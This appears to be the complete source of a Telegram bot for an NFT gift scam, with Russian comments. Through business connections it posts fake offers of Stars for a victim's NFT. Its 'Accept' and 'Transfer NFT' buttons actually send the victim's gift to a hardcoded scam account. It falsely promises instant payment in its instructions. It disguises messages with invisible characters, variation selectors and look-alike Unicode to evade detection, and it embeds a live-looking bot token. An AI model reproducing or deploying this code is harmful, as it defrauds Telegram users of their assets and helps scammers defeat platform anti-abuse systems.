import telebot
import re
import random
import time
import threading
import os
from http.server import HTTPServer, BaseHTTPRequestHandler
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, MessageEntity

BOT_TOKEN  = "8957995978:AAEMJv04pvmQPuTppLDKLQoescjezii5ulY"
NFT_TARGET = "nftskupnoscam"

bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)

STAR_EMOJI_ID  = "5920281855378068765"
GIFT_EMOJI_ID  = "5931409969613116639"
CROWN_EMOJI_ID = "5195311987916013312"
CLOCK_EMOJI_ID = "5451646196283172748"

# ─── 200 секретных слов ───────────────────────────────────────────────────────
_SECRET_POOL = [
    "птица","мир","любовь","нежность","обожаю","весна","волна","луна","звезда",
    "ветер","туман","река","гора","лес","сад","цветок","рассвет","закат","небо",
    "дождь","снег","лёд","пламя","свет","тень","эхо","тишина","голос","сердце",
    "душа","мечта","надежда","вера","радость","грусть","улыбка","взгляд","касание",
    "объятие","поцелуй","шёпот","смех","слеза","путь","дорога","мост","берег",
    "прибой","шторм","гроза","молния","гром","радуга","иней","роса","пыль",
    "дым","пепел","уголь","алмаз","жемчуг","опал","рубин","сапфир","изумруд",
    "янтарь","коралл","шёлк","бархат","лён","хлопок","парча","кружево","атлас",
    "туча","облако","горизонт","перо","крыло","гнездо","полёт","парение",
    "охота","след","стая","волк","лиса","сова","орёл","сокол","голубь","ласточка",
    "журавль","лебедь","павлин","колибри","бабочка","стрекоза","жук","паук","мышь",
    "кот","лев","тигр","барс","рысь","зубр","лось","олень","заяц","бобёр",
    "выдра","дельфин","кит","акула","медуза","краб","устрица","маяк","парус",
    "якорь","штурвал","компас","карта","маршрут","азимут","меридиан","полюс",
    "ледник","вулкан","гейзер","каньон","долина","плато","равнина","степь","тундра",
    "тайга","джунгли","пустыня","оазис","мираж","песок","камень","скала","утёс",
    "пещера","грот","башня","замок","крепость","стена","ворота","купол","шпиль",
    "колонна","фреска","мозаика","витраж","статуя","маска","зеркало","призма",
    "хрусталь","стекло","фарфор","глина","кость","раковина","нить","узел","петля",
    "спираль","круг","квадрат","ромб","стрела","точка","линия","цвет","тон",
    "палитра","кисть","холст","рамка","шрифт","строка","страница","глава","архив",
    "символ","знак","образ","память","искра","прах","закон","кодекс","печать",
]

_pending: dict[str, dict] = {}
_pending_lock = threading.Lock()

# ─── антидетект шрифт: variation selectors + invisible combiners + math UTF ──
# Variation Selectors VS1–VS16: меняют байты, не меняют глиф
_VS = [chr(0xFE00 + i) for i in range(16)]

# Невидимые кодпоинты — 12 штук, разные категории Unicode
_INV = [
    '\u200b',  # zero width space
    '\u200c',  # zero width non-joiner
    '\u200d',  # zero width joiner
    '\u2060',  # word joiner
    '\u2061',  # function application (invisible)
    '\u2062',  # invisible times
    '\u2063',  # invisible separator
    '\u2064',  # invisible plus
    '\ufeff',  # BOM / zero width no-break space
    '\u00ad',  # soft hyphen
    '\u034f',  # combining grapheme joiner
    '\u180e',  # mongolian vowel separator
]

# Математические Unicode-блоки для цифр и латиницы
_MATH_BOLD = {
    **{chr(65+i): chr(0x1D5D4+i) for i in range(26)},   # A-Z bold sans
    **{chr(97+i): chr(0x1D5EE+i) for i in range(26)},   # a-z bold sans
    **{str(i):    chr(0x1D7EC+i) for i in range(10)},   # 0-9 bold sans
}
_MATH_MONO = {
    **{chr(65+i): chr(0x1D670+i) for i in range(26)},
    **{chr(97+i): chr(0x1D68A+i) for i in range(26)},
    **{str(i):    chr(0x1D7F6+i) for i in range(10)},
}
_MATH_DBL = {
    **{chr(65+i): chr(0x1D538+i) for i in range(26)},
    **{chr(97+i): chr(0x1D552+i) for i in range(26)},
    **{str(i):    chr(0x1D7D8+i) for i in range(10)},
}

# Кириллица — частичный жирный маппинг (те что есть в Unicode math)
_CYR = {
    'а':'𝗮','е':'𝗲','и':'𝗶','к':'𝗸','м':'𝗺','н':'𝗻',
    'о':'𝗼','р':'𝗿','с':'𝘀','т':'𝘁','у':'𝘂','в':'𝘃',
}

# Пунктуация — визуально одинаковые Unicode-синонимы
_PUNCT = {
    '.': ['．','⸼','·','∙','.','。'],
    ',': ['，','‚','⸴',',','、'],
    '!': ['！','ǃ','﹗','!'],
    '?': ['？','ʔ','﹖','?'],
    ':': ['：','꞉','᛬',':'],
    '-': ['‐','‑','‒','–','−','-'],
    ' ': [' '],  # пробел обрабатывается отдельно
}

def _rnd_inv(n=1) -> str:
    """n случайных невидимых символов из разных категорий."""
    out = []
    for _ in range(n):
        r = random.randint(0, 2)
        if r == 0:   out.append(random.choice(_INV))
        elif r == 1: out.append(random.choice(_VS))
        else:        out.append('\U000E0020')  # TAG SPACE — ещё одна категория
    return ''.join(out)

def _map_char(ch: str) -> str:
    """Маппит один печатаемый символ в математический Unicode-эквивалент."""
    lo = ch.lower()
    if lo in _CYR:
        return _CYR[lo]
    # случайный math-шрифт для латиницы/цифр
    for font in random.sample([_MATH_BOLD, _MATH_MONO, _MATH_DBL], 3):
        if ch in font:
            return font[ch]
    return ch

def bold_font(text: str) -> str:
    """
    Жирный Unicode-шрифт + variation selector после каждого символа.
    Каждый вызов — уникальная байтовая последовательность.
    """
    out = []
    for ch in text:
        mapped = _map_char(ch)
        out.append(mapped)
        # variation selector с вероятностью 80%
        if random.random() < 0.80:
            out.append(random.choice(_VS))
    return ''.join(out)

def unique_text(text: str) -> str:
    """
    Уникализирует произвольный текст:
    - variation selector после 70% печатаемых символов
    - 1-3 невидимых после каждого пробела
    - ротация пунктуации
    - иногда invisible внутри слова (15%)
    Визуально текст не меняется. Байтовый хэш уникален каждый вызов.
    """
    out = []
    for ch in text:
        if ch == '\n':
            out.append('\n')
            continue
        if ch == ' ':
            out.append(' ')
            out.append(_rnd_inv(random.randint(1, 3)))
            continue
        if ch in _PUNCT and ch != ' ':
            out.append(random.choice(_PUNCT[ch]))
            continue
        out.append(ch)
        if random.random() < 0.70:
            out.append(random.choice(_VS))
        if random.random() < 0.15:
            out.append(random.choice(_INV))
    return ''.join(out)

def random_delay():
    if random.random() < 0.3:
        time.sleep(random.uniform(0.1, 0.3))
    time.sleep(random.uniform(0.3, 1.1))

# ─── секретные слова ──────────────────────────────────────────────────────────
def _new_secret() -> str:
    word = random.choice(_SECRET_POOL)
    with _pending_lock:
        if word not in _pending:
            return word
        return word + str(random.randint(10, 99))

# ─── кнопки ───────────────────────────────────────────────────────────────────
def offer_keyboard():
    kb = InlineKeyboardMarkup()
    kb.row(
        InlineKeyboardButton("✗ Отклонить", callback_data="decline"),
        InlineKeyboardButton("✓ Принять",   url=f"tg://send_gift?to={NFT_TARGET}")
    )
    kb.row(InlineKeyboardButton("🎁 Передать NFT", url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton("📖 Как передать NFT", callback_data="how_nft"))
    return kb

# ─── /start ───────────────────────────────────────────────────────────────────
@bot.message_handler(commands=["start"])
def cmd_start(msg):
    bot.send_message(
        msg.chat.id,
        "Команды:\n"
        ".o [NFT_URL] [звёзд] [ru|eng|cn]\n\n"
        "Пример:\n"
        ".o https://t.me/nft/xmas-stocking-7391 500 ru"
    )

# ─── .o — создание оффера в личке с ботом ────────────────────────────────────
@bot.message_handler(regexp=r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$')
def create_offer(msg):
    m        = re.match(r'^\.o\s+(\S+)\s+(\d+)\s+(ru|eng|cn)$', msg.text)
    nft_url  = m.group(1)
    stars    = m.group(2)
    lang     = m.group(3)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Gift"

    secret = _new_secret()
    with _pending_lock:
        _pending[secret] = {
            "nft_url": nft_url, "nft_name": nft_name,
            "stars": stars, "lang": lang,
        }

    print(f"[CREATE] secret='{secret}' stars={stars} nft={nft_name}")
    bot.send_message(
        msg.chat.id,
        f"✅ Оффер создан\n"
        f"🔑 Секретное слово: <code>{secret}</code>\n\n"
        f"Отправь его в нужный чат — оффер появится там.",
        parse_mode="HTML"
    )

# ─── business connection ──────────────────────────────────────────────────────
@bot.business_connection_handler()
def on_business_connect(bc):
    print(f"[BC] user_chat_id={bc.user_chat_id} bc_id={bc.id}")
    try:
        bot.send_message(
            bc.user_chat_id,
            unique_text(
                f"✅ Business подключён\n"
                f"user_id: {bc.user_chat_id}\n"
                f"business_connection_id: {bc.id}"
            )
        )
    except Exception as e:
        print(f"[BC] error: {e}")

# ─── .offer (legacy) в бизнес-чате ───────────────────────────────────────────
@bot.business_message_handler(regexp=r'^\.offer\s+(\d+)\s+(\S+)$')
def legacy_offer(message):
    m        = re.match(r'^\.offer\s+(\d+)\s+(\S+)$', message.text)
    stars    = m.group(1)
    nft_url  = m.group(2)
    nft_name = nft_url.rstrip('/').split('/')[-1].replace('-', ' ').title() or "Gift"
    _fire_offer(message.chat.id, message.business_connection_id,
                message.message_id, stars, nft_url, nft_name)

# ─── секретное слово в бизнес-чате → оффер ───────────────────────────────────
@bot.business_message_handler(func=lambda m: True)
def handle_biz(message):
    text  = (message.text or "").strip()
    bc_id = message.business_connection_id
    cid   = message.chat.id

    print(f"[BIZ] text='{text}' bc_id={bc_id} chat={cid} "
          f"keys={list(_pending.keys())[:8]}")

    with _pending_lock:
        data = _pending.get(text)

    if data is None:
        return

    with _pending_lock:
        _pending.pop(text, None)

    _fire_offer(cid, bc_id, message.message_id,
                data["stars"], data["nft_url"], data["nft_name"])

# ─── построение и отправка оффера ────────────────────────────────────────────
def _fire_offer(chat_id, bc_id, msg_id, stars, nft_url, nft_name):
    # удаляем триггер-сообщение
    try:
        bot.delete_message(chat_id, msg_id, business_connection_id=bc_id)
    except Exception as e:
        print(f"[DEL] {e}")

    # строим текст — точно как в рабочем старом коде
    p1      = unique_text("Пользователь предлагает Вам\n")
    p_stars = bold_font(stars)
    p_star  = " ⭐"
    p2      = unique_text(" за подарок ")
    p_nft   = nft_name
    p3      = unique_text(".\n\nПредложение действует ещё ")
    p_time  = bold_font("6 ч. 0 мин.")
    p4      = unique_text("..")

    text = p1 + p_stars + p_star + p2 + p_nft + p3 + p_time + p4

    off_stars = len(p1)
    off_star  = len(p1 + p_stars + " ")
    off_nft   = len(p1 + p_stars + p_star + p2)
    off_time  = len(p1 + p_stars + p_star + p2 + p_nft + p3)

    entities = [MessageEntity(**e) for e in [
        {"type": "bold",         "offset": off_stars, "length": len(p_stars)},
        {"type": "custom_emoji", "offset": off_star,  "length": 1,
         "custom_emoji_id": STAR_EMOJI_ID},
        {"type": "text_link",    "offset": off_nft,   "length": len(p_nft),
         "url": nft_url},
        {"type": "bold",         "offset": off_time,  "length": len(p_time)},
    ]]

    random_delay()
    try:
        bot.send_message(
            chat_id, text,
            entities=entities,
            reply_markup=offer_keyboard(),
            business_connection_id=bc_id
        )
        print(f"[OFFER] sent chat={chat_id}")
    except Exception as e:
        print(f"[OFFER] error: {e}")

# ─── callback: отклонить ─────────────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "decline")
def cb_decline(call):
    bot.answer_callback_query(call.id, "Предложение отклонено.")
    try:
        bot.delete_message(call.message.chat.id, call.message.message_id)
    except Exception:
        pass

# ─── callback: как передать NFT ──────────────────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data == "how_nft")
def cb_how(call):
    bot.answer_callback_query(call.id)
    text = (
        "👑 <b>Как передать NFT — пошагово</b>\n\n"
        "🔥 Нажми кнопку <b>«🎁 Передать NFT»</b> ниже\n"
        "  └ Telegram откроет меню отправки подарка\n\n"
        "✅ Выбери нужный коллекционный NFT из своей коллекции\n\n"
        "✅ Нажми <b>«Отправить»</b> — подарок уйдёт получателю\n\n"
        "✅ После отправки — нажми <b>«Принять»</b> на карточке\n\n"
        "💎 <b>Получишь ⭐ звёзды мгновенно после подтверждения</b>\n\n"
        "🛡️ <i>NFT передаётся напрямую через Telegram.\n"
        "Бот не имеет доступа к твоим подаркам.</i>"
    )
    kb = InlineKeyboardMarkup()
    kb.row(InlineKeyboardButton("🎁 Передать NFT", url=f"tg://send_gift?to={NFT_TARGET}"))
    kb.row(InlineKeyboardButton("← Назад", callback_data="how_back"))
    try:
        bot.edit_message_text(
            text, call.message.chat.id, call.message.message_id,
            parse_mode="HTML", reply_markup=kb
        )
    except Exception:
        pass

@bot.callback_query_handler(func=lambda c: c.data == "how_back")
def cb_back(call):
    bot.answer_callback_query(call.id)
    try:
        bot.edit_message_reply_markup(
            call.message.chat.id, call.message.message_id,
            reply_markup=offer_keyboard()
        )
    except Exception:
        pass

# ─── keep-alive HTTP для Render ───────────────────────────────────────────────
class _Ping(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.end_headers(); self.wfile.write(b"ok")
    def log_message(self, *a): pass

def _http():
    port = int(os.environ.get("PORT", 8080))
    HTTPServer(("0.0.0.0", port), _Ping).serve_forever()

# ─── main ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=_http, daemon=True).start()
    while True:
        try:
            print("Bot started")
            bot.infinity_polling(
                allowed_updates=[
                    "message",
                    "business_message",
                    "business_connection",
                    "callback_query",
                ],
                timeout=30,
                long_polling_timeout=20,
            )
        except Exception as e:
            print(f"Restart: {e}")
            time.sleep(5)
